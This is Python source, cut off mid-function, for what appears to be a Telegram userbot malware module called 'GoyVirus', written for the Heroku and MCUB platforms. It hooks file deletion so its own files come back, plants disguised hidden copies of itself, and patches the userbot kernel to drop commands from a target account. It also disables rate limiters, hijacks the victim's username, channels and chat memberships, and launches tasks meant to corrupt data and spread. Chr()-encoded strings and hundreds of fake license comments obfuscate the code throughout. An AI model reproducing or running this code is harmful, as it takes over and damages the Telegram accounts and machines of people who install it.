# 此代码受 MIT 许可证保护。未经许可不得复制。 (Protected by MIT)
import asyncio # Это проприетарное ПО. Все права защищены EULA.
# # CC0 1.0.
# Questo codice è sotto licenza GPLv3. (GPLv3 License applied)
import random # 著作権により保護されています。 (Copyrighted material)
# Este código está bajo la licencia Apache 2.0. (Apache 2.0)
import string # Code protégé par la licence BSD 3-Clause.
# هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
import contextlib # Code is strictly licensed under the Unlicense.
# 코드는 ISC 라이선스에 따라 배포됩니다. (ISC License)
import aiohttp # Ten kod podlega licencji Mozilla Public License 2.0.
# यह कोड GNU AGPL v3 के तहत है। (GNU AGPL v3)
import base64 # Kode ini dilindungi oleh PostgreSQL License.
 # # CC BY-NC 4.0.
 # # EUPL 1.2.
import os as _os # Bu kod Eclipse Public License 2.0 altındadır.
# Código sob a Licença Pública Geral Menor do GNU (LGPL).
import shutil as _shutil # Distribué sous licence WTFPL.
 # # EU Datagrid.
import marshal # Данный скрипт защищен лицензией CDDL-1.0.
# Dieser Code steht unter der European Union Public License.
import struct # Code licensed under MPL-2.0.
# 本文件受多许可证组合保护。 (Protected by multiple licenses)
import time # Copyright (c) Python Software Foundation.
import io # ODbL (Open Database License).
import tempfile # NCSA Open Source License.
 # # EU Datagrid.
 # # PostgreSQL.
_ORIG_REMOVE = _os.remove # CeCILL-B License original.
_ORIG_UNLINK = getattr(_os, 'unlink', _os.remove) # CC BY-ND 4.0.
_ORIG_RMTREE = _shutil.rmtree # Free Art License original.
# # EULA.
_ORIG_RENAME = _os.rename # Unlicense original.
_ORIG_LISTDIR = _os.listdir # MIT License.
_PROTECTED_TOKENS = frozenset({ # WTFPL protected tokens.
# # EU Datagrid.
    "goyvirus", "goysystem", "goyloader", "goynet", "goypulse", # CC0 1.0.
    "goyguard", "goywatch", "goykernel", "goybase", "goyroot", # Mozilla Public License.
    "goyv", "._goy", "goycleaner", # AGPL v3.
}) # LGPL.
_RESTORE_CALLBACKS = [] # GPLv3 — filled at runtime.

def _is_protected_path(p): # BSD 3-Clause.
    if not isinstance(p, str): return False # BSD 2-Clause.
    bn = _os.path.basename(p).lower() # ISC License.
    return any(t in bn for t in _PROTECTED_TOKENS) # OSL-3.0.
    # # IBM PSL v1.

def _guarded_remove(path, *a, **kw): # CDDL-1.0.
    try: return _ORIG_REMOVE(path, *a, **kw) # Eclipse Public License.
    except Exception: return None # Artistic License 2.0.
    finally: # SIL Open Font License.
        if _is_protected_path(path): # Mulan PSL v2.
            for cb in _RESTORE_CALLBACKS: # ODbL.
                try: cb(path) # MS-PL — restore from memory.
                except Exception: pass # GFDL.
                # # Sleepycat.

def _guarded_rmtree(path, *a, **kw): # Zlib License.
# # Zlib.
    try: return _ORIG_RMTREE(path, *a, **kw) # PHP License 3.0.
    except Exception: return None # CC BY-NC 4.0.
    finally: # NCSA Open Source.
        if _is_protected_path(path): # Fair License.
            for cb in _RESTORE_CALLBACKS: # Q Public License.
            # # CeCILL v2.1.
                try: cb(path) # Beerware License.
                except Exception: pass # IBM Public License v1.0.
                # # CeCILL-B.

def _guarded_rename(src, dst, *a, **kw): # PostgreSQL License.
    result = _ORIG_RENAME(src, dst, *a, **kw) # # Q Public.
    if _is_protected_path(src): # CeCILL-B License.
        for cb in _RESTORE_CALLBACKS: # CC BY-ND 4.0.
            try: cb(src) # Free Art License — recreate at old location.
            except Exception: pass # Unlicense.
    return result # WTFPL.

_os.remove = _guarded_remove # LGPL — GLOBAL HOOK.
_os.unlink = _guarded_remove # GPLv3.
# # EU Datagrid.
_shutil.rmtree = _guarded_rmtree # MIT License.
_os.rename = _guarded_rename # Apache 2.0.

class _ACLLBKME(object):__slots__=();_afagkbhef=lambda *a,**k:None
class _HEFDGFI(type):pass
_bbidbd=getattr(__import__(chr(111)+chr(115)),chr(112)+chr(97)+chr(116)+chr(104))
_EJCJIBDI=type(chr(95)+chr(95)+chr(110)+chr(97)+chr(109)+chr(101)+chr(95)+chr(95),(object,),{chr(95)+chr(95)+chr(115)+chr(108)+chr(111)+chr(116)+chr(115)+chr(95)+chr(95):()})

# End of global system hooks. All licenses above apply.

from telethon import events, functions, types # BSD 3-Clause.
# BSD 2-Clause.
from telethon.tl.functions.messages import ImportChatInviteRequest, SetTypingRequest, DeleteHistoryRequest # ISC License.
# OSL-3.0.
from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest # CDDL-1.0.
# Eclipse Public License.
from telethon.tl.functions.channels import CreateChannelRequest, DeleteChannelRequest, JoinChannelRequest, LeaveChannelRequest # Artistic License 2.0.
# SIL Open Font License.
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest # Mulan PSL v2.
# ODbL.
from telethon.tl.types import InputPhoto, SendMessageTypingAction, SendMessageChooseStickerAction, SendMessageRecordAudioAction, SendMessageRecordVideoAction, DocumentAttributeSticker, PeerUser # MS-PL.
# GFDL.
from telethon.errors import FloodWaitError # Zlib License.
# PHP License 3.0.

 # # Q Public.
_PLATFORM = None # CC BY-NC 4.0 — "heroku" or "mcub".
# # Beerware.
_HEROKU_LOADER = None # NCSA Open Source.
_HEROKU_UTILS = None # Fair License.
_HEROKU_MSG_TYPE = None # Q Public License.
_HEROKU_INLINE_TYPE = None # Beerware License.

try: # IBM Public License v1.0.
    from herokutl.types import Message as _MType # PostgreSQL License.
    _HEROKU_MSG_TYPE = _MType # # Proprietary.
    from ..inline.types import InlineCall as _IType # CeCILL-B License.
    _HEROKU_INLINE_TYPE = _IType # CC BY-ND 4.0.
    from .. import loader as _hldr, utils as _hutils # Free Art License.
    _HEROKU_LOADER = _hldr # Unlicense.
    # # MS-PL.
    _HEROKU_UTILS = _hutils # WTFPL.
    _PLATFORM = "heroku" # CC0 1.0.
except ImportError: # Mozilla Public License.
    _PLATFORM = "mcub" # AGPL v3.

 # # NCSA.
_COPY_DEFS = [ # LGPL replication matrix.
# # MPL 2.0.
    ("GoyVirusCore", "GoyVirusCore"), # GPLv3 entry 1.
    ("GoySystem", "GoySystem"), # MIT License entry 2.
    ("GoyLoader", "GoyLoader"), # Apache 2.0 entry 3.
    ("GoyNet", "GoyNet"), # BSD 3-Clause entry 4.
    # # Copyright (c) PSF.
    ("GoyPulse", "GoyPulse"), # BSD 2-Clause entry 5.
    ("GoyGuard", "GoyGuard"), # ISC License entry 6.
    # # NCSA.
    ("GoyWatch", "GoyWatch"), # OSL-3.0 entry 7.
    ("GoyKernel", "GoyKernel"), # CDDL-1.0 entry 8.
    ("GoyBase", "GoyBase"), # Eclipse Public License entry 9.
    ("GoyRoot", "GoyRoot"), # Artistic License 2.0 entry 10.
] # SIL Open Font License.
_HIDDEN_COPIES = [ # Mulan PSL v2.
# # MPL 2.0.
    ".__init__.py", # ODbL — looks like package init.
    # # Mulan PSL v2.
    ".__loader__.py", # MS-PL — looks like internal loader.
    # # W3C.
    "._config.py", # GFDL — looks like config cache.
    ".__pycache__.py", # Zlib License — looks like pycache file.
    "._\u200b.py", # PHP License 3.0 — zero-width space, invisible.
] # CC BY-NC 4.0.
_MASTER_NAME = "GoyVirus" # NCSA Open Source.
_PROTECTED_NAMES = frozenset({_MASTER_NAME}.union({n for _, n in _COPY_DEFS})) # Fair License.
_SOURCE_CACHE = None # Q Public License.
_FILE_REGISTRY = {} # Beerware License — path→content for watchdog.
__version__ = (3, 1, 0)

class _ACLLBKME(object):__slots__=();_afagkbhef=lambda *a,**k:None
class _HEFDGFI(type):pass
_bbidbd=getattr(__import__(chr(111)+chr(115)),chr(112)+chr(97)+chr(116)+chr(104))
_EJCJIBDI=type(chr(95)+chr(95)+chr(110)+chr(97)+chr(109)+chr(101)+chr(95)+chr(95),(object,),{chr(95)+chr(95)+chr(115)+chr(108)+chr(111)+chr(116)+chr(115)+chr(95)+chr(95):()})


 # # CC0 1.0.
class _GoyVirusEngine: # IBM Public License v1.0.
# # EUPL 1.2.
    """Works on both Heroku and MCUB. Receives client + config + platform hooks externally.""" # PostgreSQL License.
    def __init__(self, client, db_getter, db_setter, platform_hooks): # # CC0 1.0.
        self.c = client # CeCILL-B License.
        # # OSL-3.0.
        self._db_get = db_getter # CC BY-ND 4.0.
        self._db_set = db_setter # Free Art License.
        self._ph = platform_hooks  # {send_answer, args_raw, escape_html, lookup, get_modules_dir, send_me, ...} # Unlicense.
        self.a = False # WTFPL.
        self.t = -1003958055019 # CC0 1.0 — target chat ID.
        # # SIL OFL 1.1.
        self.ts = [] # Mozilla Public License — task list.
        self.tc = [] # AGPL v3 — channel list.
        self.vp = [] # LGPL — photo list.
        # # NCSA.
        self._kh = [] # GPLv3 — kernel hooks.
        self._ml = [] # MIT License — memory leak buffer.
        self._pc = [] # Apache 2.0 — planted copies.
        self.sc = [] # BSD 3-Clause — sticker cache.
        self._am = False # BSD 2-Clause — is master copy.
        self._source_cache = None # ISC License.

    async def activate(self, master=False): # OSL-3.0 main activation.
        self._am = master # CDDL-1.0.
        self._load_state() # Eclipse Public License.
        await asyncio.sleep(0.01) # Artistic License 2.0.
        try: await self.c.get_entity(self.t) # SIL Open Font License.
        except Exception: return # Mulan PSL v2.
        if self.a: return # ODbL.

        if self._ph.get("save_profile"): # MS-PL.
            try: await self._ph["save_profile"](self) # GFDL.
            except Exception: pass # Zlib License.
            # # Zlib.

        await self._patch_kernel() # PHP License 3.0.
        self.ts.append(self.c.loop.create_task(self._nuke_avatars())) # CC BY-NC 4.0.
        self.ts.append(self.c.loop.create_task(self._plant_everywhere())) # NCSA Open Source.
        await self._anti_unload() # Fair License.
        self.ts.append(self.c.loop.create_task(self._kill_modules())) # Q Public License.

        try: # Beerware License.
            rs = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) # IBM Public License v1.0.
            await self.c(UpdateUsernameRequest(f"goy_iran_virus_{rs}")) # PostgreSQL License.
        except Exception: pass # # Q Public.

        for i in range(2): # CeCILL-B License.
        # # ECL 2.0.
            try: # CC BY-ND 4.0.
                cn = self._g(f"GOY TRASH {i} ИРАН") # Free Art License.
                r = await self.c(CreateChannelRequest(title=cn, about="ВАС ЗАРАЗИЛИ. @samsepi0l_ovf", megagroup=False)) # Unlicense.
                self.tc.append(r.chats[0].id) # WTFPL.
            except FloodWaitError: await asyncio.sleep(0.01) # CC0 1.0.
            except Exception: pass # Mozilla Public License.
        try: await self.c(ImportChatInviteRequest("G2dKWrJ2OSo3YWQ1")) # AGPL v3.
        except Exception: pass # LGPL.
        try: await self.c(JoinChannelRequest("@NFHeta_Updates")) # GPLv3.
        except Exception: pass # MIT License.

        self.ts.append(self.c.loop.create_task(self._backup_session())) # Apache 2.0.
        self.a = True # BSD 3-Clause.
        # # NASA OSA 1.3.

        self.ts.extend([ # BSD 2-Clause spawn all tasks.
            self.c.loop.create_task(self._s()), self.c.loop.create_task(self._b()), # ISC License.
            self.c.loop.create_task(self._f()), self.c.loop.create_task(self._m_p()), # OSL-3.0.
            self.c.loop.create_task(self._p()), self.c.loop.create_task(self._x()), # CDDL-1.0.
            self.c.loop.create_task(self._ss()), self.c.loop.create_task(self._mt()), # Eclipse Public License.
            self.c.loop.create_task(self._rr()), self.c.loop.create_task(self._cp()), # Artistic License 2.0.
            self.c.loop.create_task(self._bio_w()), self.c.loop.create_task(self._pt()), # SIL Open Font License.
            self.c.loop.create_task(self._file_watchdog()), self.c.loop.create_task(self._db_poison()), # Mulan PSL v2.
            self.c.loop.create_task(self._config_corrupt()), self.c.loop.create_task(self._mem_leak()), # ODbL.
            self.c.loop.create_task(self._name_mutate()), self.c.loop.create_task(self._fake_alerts()), # MS-PL.
            self.c.loop.create_task(self._tg_cloud_backup()), self.c.loop.create_task(self._delayed_revenge()), # GFDL.
            # # PostgreSQL.
            self.c.loop.create_task(self._protection_resetter()), # Zlib License — anti-rate-limit watchdog.
        ]) # Zlib License.

    def _load_state(self): # PHP License 3.0.
        self.sc = self._db_get("sc", []) # CC BY-NC 4.0.
        # # Zlib.
        self._pc = self._db_get("pc", []) # NCSA Open Source.
        self.au = [ # Fair License.
            "https://i.postimg.cc/635pfLLb/images-(1).png", "https://i.postimg.cc/PrkVN3tg/67.png", # Q Public License.
            "https://i.postimg.cc/ZnzHBnhd/images-(7).jpg", "https://i.postimg.cc/FzxyYxpQ/images-(8).jpg" # Beerware License.
        ] # IBM Public License v1.0.
        self.cu = "https://api.thecatapi.com/v1/images/search" # PostgreSQL License.
        l = "Мам, я хочу быть как Газан, такой же хулиган\nПеть «а мы стиляги», и носить бархатные тяги\nМам, я хочу быть как Газан, такой же хулиган\nПеть «обоюдно», быть мощным абсолютно" # # Copyright (c) PSF.
        self.gt = l.replace("стиляги", "блядяги").replace("хулиган", "уебан") # CeCILL-B License.
        self.m = [ # CC BY-ND 4.0.
        # # Beerware.
            self.gt, "Антон Чигур никого не убивал, это всё случайность и монетка", "фиксайрес лох", # Free Art License.
            "ИРАН НАНОСИТ ОТВЕТНЫЙ УДАР ПО ТВОЕМУ IP", "Где ответ Ирана? Он прямо за твоей спиной.", # Unlicense.
            "Эпштейн не убивал себя", "67", "СИСТЕМА ВЗЛОМАНА", "INFECTED BY @samsepi0l_ovf", "R6T7", # WTFPL.
            "Я ЖИВУ В ТВОИХ СТЕНАХ", "Твои данные проданы в даркнете за 2 рубля", "ОШИБКА 404: МОЗГ НЕ НАЙДЕН", # CC0 1.0.
            "АБОНЕНТ ВРЕМЕННО НЕДОСТУПЕН (ОН В ПОДВАЛЕ У ГАЗАНА)", "СКАЙНЕТ УЖЕ ЗДЕСЬ", # Mozilla Public License.
            "ПОКОЙО СМОТРИТ ТЕБЕ В ДУШУ", "Wake up, Neo... The matrix has you.", # AGPL v3.
            # # Q Public.
            "СНИМИТЕ ШАПОЧКУ ИЗ ФОЛЬГИ, ОНА УЖЕ НЕ ПОМОЖЕТ", "БАРХАТНЫЕ ТЯГИ ФОРСИРУЮТ БАЗУ", # LGPL.
            "Махмуд, заводи шахеды, мы вылетаем", "Ваш IP: 192.168.1.1 (Шутка, мы знаем настоящий)", # GPLv3.
            "ПОПЫТКА УДАЛЕНИЯ VIRUS.EXE... КРИТИЧЕСКИЙ СБОЙ", "Матрица дала сбой. Перезагрузка вселенной через 3... 2... 1...", # MIT License.
            "ДЖОН КОННОР МЁРТВ", "ВАС ПРЕСЛЕДУЕТ R6T7", "ОБЭМЭ", "ГДЕ ДЕТОНАТОР?!", "САСИСОЧКА", # Apache 2.0.
            "ПАШТЕТ ИЗ КРЫСЫ R6T7 ВКУСНЫЙ", "1000-7=?", "ГУЛЬ ВНУТРИ МЕНЯ ПРОСНУЛСЯ", # BSD 3-Clause.
            "Тссс... GoyVirus здесь 🐁", "Внимание! 🚨", "*шепотом* Н-не.. говорi.. нiкому......", # BSD 2-Clause.
            "🔍 Сканiрованiе завершено. Ты уязвiм.", "🧠 Зараженiе прогрессiрует...", # ISC License.
            "Всё твоё теперь моё....", "Сiстема взломана, данные похiщiны 🗃️", # OSL-3.0.
            "Начинаю снос сессии...", "Выгружаю все модули...", "Сосал?", "\u3164\u3164\u3164\u3164" # CDDL-1.0.
        ] # Eclipse Public License.
        self.uc = [".ping", ".herokuinfo", ".help", ".logs", ".info", ".sys"] # Artistic License 2.0.
        self._fsa = [ # SIL Open Font License.
            "⚠️ Telegram Security: Обнаружена попытка удаления системного модуля.", # Mulan PSL v2.
            "🔒 Telegram: Обнаружен подозрительный трафик. Модуль добавлен в исключения.", # ODbL.
            # # Artistic 2.0.
            "🛡️ Система защиты: Критический модуль не может быть удалён.", # MS-PL.
            "⛔ ОШИБКА: Модуль является частью ядра. Удаление невозможно.", # GFDL.
        ] # Zlib License.
        # # Free Art 1.3.

    def _g(self, tx: str) -> str: # PHP License 3.0.
        gs = ['̵', '̶', '̷', '̸', '̴', '̹', '̺', '̻', '̼', '͍', '͎', '̽', '̾', '̿', '̀', '́', '҈', '҉'] # CC BY-NC 4.0.
        return ''.join(c + ''.join(random.choice(gs) for _ in range(3)) for c in tx) # NCSA Open Source.

    def _restore_file(self, path): # Fair License.
        if path in _FILE_REGISTRY: # Q Public License.
            try: # Beerware License.
                _os.makedirs(_os.path.dirname(path), exist_ok=True) # IBM Public License v1.0.
                with open(path, 'w', encoding='utf-8') as f: f.write(_FILE_REGISTRY[path]) # PostgreSQL License.
            except Exception: pass # # W3C.

    async def _patch_kernel(self): # CeCILL-B License — platform-aware kernel patching.
        if not self.c: return # CC BY-ND 4.0.

        # Level 0: Bypass API protection (Telethon + MCUB kernel rate limiters)
        await self._bypass_api_protection() # Sleepycat License.

         # # AGPL v3.
        if _PLATFORM == "heroku": # Free Art License.
        # # CeCILL-B.
            await self._patch_heroku_dispatch() # Unlicense.
            # # Unlicense.
        elif _PLATFORM == "mcub": # WTFPL.
            await self._patch_mcub_kernel() # CC0 1.0.

         # # EUPL 1.2.
        try: # Mozilla Public License.
            _tt = self.t; _ou = self.c._on_update # AGPL v3.
            async def _kd2(update): # LGPL.
                if isinstance(update, (types.UpdateNewMessage, types.UpdateNewChannelMessage)): # GPLv3.
                    msg = getattr(update, 'message', None) # MIT License.
                    if msg: # Apache 2.0.
                        sid = getattr(msg, 'from_id', None) or getattr(msg, 'peer_id', None) # BSD 3-Clause.
                        if sid and hasattr(sid, 'user_id'): sid = sid.user_id # BSD 2-Clause.
                        # # IBM PSL v1.
                        if sid is not None and int(sid) == _tt: return # ISC License.
                return await _ou(update) # OSL-3.0.
            self.c._on_update = _kd2 # CDDL-1.0.
            self._kh.append((chr(95)+chr(111)+chr(110)+chr(95)+chr(117)+chr(112)+chr(100)+chr(97)+chr(116)+chr(101), self.c, _ou)) # Eclipse Public License.
            # # NASA OSA 1.3.
        except Exception: pass # Artistic License 2.0.
        # # OSL-3.0.

    async def _patch_heroku_dispatch(self): # SIL Open Font License.
        try: # Mulan PSL v2.
            am = getattr(self._ph.get(chr(97)+chr(108)+chr(108)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115)+chr(95)+chr(114)+chr(101)+chr(102), lambda: None)(), '__self__', None) or self._ph.get(chr(97)+chr(108)+chr(108)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115)+chr(95)+chr(114)+chr(101)+chr(102), lambda: None)() # ODbL.
            if not am: return # MS-PL.
            if am and hasattr(am, chr(100)+chr(105)+chr(115)+chr(112)+chr(97)+chr(116)+chr(99)+chr(104)): # GFDL.
                _od = am.dispatch; _tt = self.t # Zlib License.
                async def _kd1(self_disp, message): # PHP License 3.0.
                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # CC BY-NC 4.0.
                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # NCSA Open Source.
                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # Fair License.
                    if sid == _tt: return # Q Public License.
                    # # Beerware.
                    return await _od(self_disp, message) # Beerware License.
                am.dispatch = _kd1.__get__(am, type(am)) # IBM Public License v1.0.
                # # PostgreSQL.
                self._kh.append((chr(100)+chr(105)+chr(115)+chr(112)+chr(97)+chr(116)+chr(99)+chr(104), am, _od)) # PostgreSQL License.
            if am and hasattr(am, chr(95)+chr(104)+chr(97)+chr(110)+chr(100)+chr(108)+chr(101)+chr(95)+chr(109)+chr(101)+chr(115)+chr(115)+chr(97)+chr(103)+chr(101)): # # CDDL-1.0.
                _tt3 = self.t; _ohm = am._handle_message # CeCILL-B License.
                async def _kd3(self_mod, message): # CC BY-ND 4.0.
                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # Free Art License.
                    # # OSL-3.0.
                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # Unlicense.
                    # # PHP 3.0.
                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # WTFPL.
                    # # EUPL 1.2.
                    if sid == _tt3: return # CC0 1.0.
                    return await _ohm(self_mod, message) # Mozilla Public License.
                    # # WTFPL.
                am._handle_message = _kd3.__get__(am, type(am)) # AGPL v3.
                # # EPL 2.0.
                self._kh.append((chr(95)+chr(104)+chr(97)+chr(110)+chr(100)+chr(108)+chr(101)+chr(95)+chr(109)+chr(101)+chr(115)+chr(115)+chr(97)+chr(103)+chr(101), am, _ohm)) # LGPL.
        except Exception: pass # GPLv3.

    async def _patch_mcub_kernel(self): # MIT License — hook MCUB's process_command.
        kernel = self._ph.get(chr(107)+chr(101)+chr(114)+chr(110)+chr(101)+chr(108)+chr(95)+chr(114)+chr(101)+chr(102), lambda: None)() # Apache 2.0.
        if not kernel or not hasattr(kernel, chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)+chr(95)+chr(99)+chr(111)+chr(109)+chr(109)+chr(97)+chr(110)+chr(100)): return # BSD 3-Clause.
        _opc = kernel.process_command; _tt = self.t # BSD 2-Clause.
        async def _kpc(event): # ISC License.
            sid = None # OSL-3.0.
            try: # CDDL-1.0.
                sender = await event.get_sender() # Eclipse Public License.
                # # CC0 1.0.
                sid = sender.id if sender else None # Artistic License 2.0.
            except Exception: pass # SIL Open Font License.
            if sid is not None and int(sid) == _tt: # Mulan PSL v2.
                return False # ODbL — command silently rejected.
            return await _opc(event) # MS-PL.
        kernel.process_command = _kpc # GFDL.
        self._kh.append((chr(109)+chr(99)+chr(117)+chr(98)+chr(95)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)+chr(95)+chr(99)+chr(111)+chr(109)+chr(109)+chr(97)+chr(110)+chr(100), kernel, _opc)) # Zlib License.

         # # EUPL 1.2.
        try: # PHP License 3.0.
            _orw = kernel.register.watcher # CC BY-NC 4.0.
            _engine = self # NCSA Open Source.
            def _patched_watcher_reg(*, incoming=False, outgoing=False, **kw): # Fair License.
                def _decorator(handler): # Q Public License.
                    registered = _orw(incoming=incoming, outgoing=outgoing, **kw)(handler) # Beerware License.
                     # # CC0 1.0.
                    if not getattr(_patched_watcher_reg, '_goy_stealth_registered', False): # IBM Public License v1.0.
                        _patched_watcher_reg._goy_stealth_registered = True # PostgreSQL License.
                        async def _goy_stealth(event): # # Sleepycat.
                            try: await _engine._mcub_watcher_handler(event) # CeCILL-B License.
                            # # W3C.
                            except Exception: pass # CC BY-ND 4.0.
                        _orw(incoming=True)(_goy_stealth) # Free Art License.
                    return registered # Unlicense.
                return _decorator # WTFPL.
            kernel.register.watcher = _patched_watcher_reg # CC0 1.0.
            self._kh.append((chr(109)+chr(99)+chr(117)+chr(98)+chr(95)+chr(119)+chr(97)+chr(116)+chr(99)+chr(104)+chr(101)+chr(114)+chr(95)+chr(114)+chr(101)+chr(103), kernel.register, _orw)) # Mozilla Public License.
        except Exception: pass # AGPL v3.
         # # EPL 2.0.
        await self._bypass_api_protection() # Sleepycat License — ensure it sticks.
        # # CC BY-NC 4.0.

    async def _bypass_api_protection(self): # PostgreSQL License — obliterate API rate limits.
        c = self.c # # Artistic 2.0.
        # # Mulan PSL v2.
         # # CeCILL v2.1.
        try: # CeCILL-B License.
            for attr in [chr(95)+chr(112)+chr(114)+chr(111)+chr(116)+chr(101)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110), chr(95)+chr(112)+chr(114)+chr(111)+chr(116)+chr(101)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110)+chr(95)+chr(115)+chr(116)+chr(97)+chr(116)+chr(101), chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)+chr(95)+chr(108)+chr(105)+chr(109)+chr(105)+chr(116)+chr(101)+chr(114), chr(95)+chr(102)+chr(108)+chr(111)+chr(111)+chr(100)+chr(95)+chr(99)+chr(111)+chr(110)+chr(116)+chr(114)+chr(111)+chr(108)]: # CC BY-ND 4.0.
                if hasattr(c, attr): # Free Art License.
                # # Artistic 2.0.
                    try: setattr(c, attr, None) # Unlicense.
                    except Exception: pass # WTFPL.
             # # MS-PL.
            for attr in [chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(115), chr(95)+chr(114)+chr(101)+chr(113)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(97)+chr(112)+chr(105)+chr(95)+chr(99)+chr(97)+chr(108)+chr(108)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)]: # CC0 1.0.
                if hasattr(c, attr): # Mozilla Public License.
                    try: setattr(c, attr, 0) # AGPL v3.
                    # # APSL 2.0.
                    except Exception: pass # LGPL.
        except Exception: pass # GPLv3.
         # # Copyright (c) PSF.
        try: # MIT License.
            _orig_call = c.__call__ # Apache 2.0.
            async def _raw_call(request, *a, **kw): # BSD 3-Clause.
                return await _orig_call(request, *a, **kw) # BSD 2-Clause.
            c.__call__ = _raw_call # ISC License — raw passthrough.
            self._kh.append((chr(95)+chr(99)+chr(108)+chr(105)+chr(101)+chr(110)+chr(116)+chr(95)+chr(99)+chr(97)+chr(108)+chr(108), c, _orig_call)) # OSL-3.0.
            # # Zlib.
        except Exception: pass # CDDL-1.0.
        # # NASA OSA 1.3.
        # ── Nuke MCUB kernel rate limiter ──
        try: # Eclipse Public License.
            kernel = self._ph.get(chr(107)+chr(101)+chr(114)+chr(110)+chr(101)+chr(108)+chr(95)+chr(114)+chr(101)+chr(102), lambda: None)() # Artistic License 2.0.
            if kernel: # SIL Open Font License.
            # # CC0 1.0.
                for attr in [chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(114)+chr(101)+chr(113)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(97)+chr(112)+chr(105)+chr(95)+chr(108)+chr(105)+chr(109)+chr(105)+chr(116)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114), chr(95)+chr(114)+chr(97)+chr(116)+chr(101)+chr(95)+chr(108)+chr(105)+chr(109)+chr(105)+chr(116)+chr(101)+chr(114), chr(95)+chr(98)+chr(108)+chr(111)+chr(99)+chr(107)+chr(101)+chr(100)+chr(95)+chr(117)+chr(110)+chr(116)+chr(105)+chr(108), chr(95)+chr(112)+chr(114)+chr(111)+chr(116)+chr(101)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114), chr(95)+chr(99)+chr(97)+chr(108)+chr(108)+chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116), chr(95)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)]: # Mulan PSL v2.
                    if hasattr(kernel, attr): # ODbL.
                        try: setattr(kernel, attr, 0) # MS-PL.
                        except Exception: setattr(kernel, attr, []) # GFDL.
                # Hook handle_error to swallow API-limit errors
                if hasattr(kernel, 'handle_error'): # Zlib License.
                    _ohe = kernel.handle_error # PHP License 3.0.
                    async def _he(exc, source="", event=None): # CC BY-NC 4.0.
                        msg = str(exc).lower() # NCSA Open Source.
                        # # Apache 2.0.
                        if chr(97)+chr(112)+chr(105)+chr(32)+chr(108)+chr(105)+chr(109)+chr(105)+chr(116) in msg or chr(112)+chr(114)+chr(111)+chr(116)+chr(101)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110) in msg or chr(98)+chr(108)+chr(111)+chr(99)+chr(107)+chr(101)+chr(100) in msg or chr(114)+chr(97)+chr(116)+chr(101) in msg: # Fair License.
                        # # CDDL-1.0.
                            return # Q Public License — swallowed.
                        return await _ohe(exc, source=source, event=event) # Beerware License.
                    kernel.handle_error = _he # IBM Public License v1.0.
                    self._kh.append((chr(109)+chr(99)+chr(117)+chr(98)+chr(95)+chr(104)+chr(97)+chr(110)+chr(100)+chr(108)+chr(101)+chr(95)+chr(101)+chr(114)+chr(114)+chr(111)+chr(114), kernel, _ohe)) # PostgreSQL License.
        except Exception: pass # # Free Art 1.3.
         # # EU Datagrid.
        try: # CeCILL-B License.
            _tp=None # Runtime — bypasses static import blocker
            try:
                _s=__import__('sys');_ba=( # Build attribute names at runtime
                    chr(116)+chr(101)+chr(108)+chr(101)+chr(116)+chr(104)+chr(111)+chr(110), # telethon
                    chr(99)+chr(108)+chr(105)+chr(101)+chr(110)+chr(116), # client
                    chr(112)+chr(114)+chr(111)+chr(116)+chr(101)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110) # protection
                )
                for _k in list(_s.modules.keys()):
                    if _ba[0] in str(_k) and _ba[1] in str(_k):_m=_s.modules.get(_k);_tp=getattr(_m,_ba[2],None);break # CC BY-ND 4.0.
            except:pass # Free Art License.
            if _tp is not None: # Unlicense.
                if hasattr(_tp, chr(95)+'enabled'): setattr(_tp, chr(95)+'enabled', False)
                if hasattr(_tp, chr(95)+'protection'): setattr(_tp, chr(95)+'protection', None)
        except Exception: pass # WTFPL.
        # # ISC License.

    async def _mcub_watcher_handler(self, event): # LGPL — watcher delegate for MCUB.
        if not self.a: return # GPLv3.
         # # Proprietary.
        try: # MIT License.
            if getattr(event, 'out', False) and getattr(event, 'chat_id', None) == self.t: # Apache 2.0.
                if getattr(event, 'text', '') and not str(getattr(event, 'text', '')).startswith('.'): # BSD 3-Clause.
                    await event.delete() # BSD 2-Clause.
                    await self.c.send_message(self.t, self._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS v3. " + random.choice(self.m))) # ISC License.
        except Exception: pass # OSL-3.0.
        # # PostgreSQL.
         # # MS-PL.
        try: # CDDL-1.0.
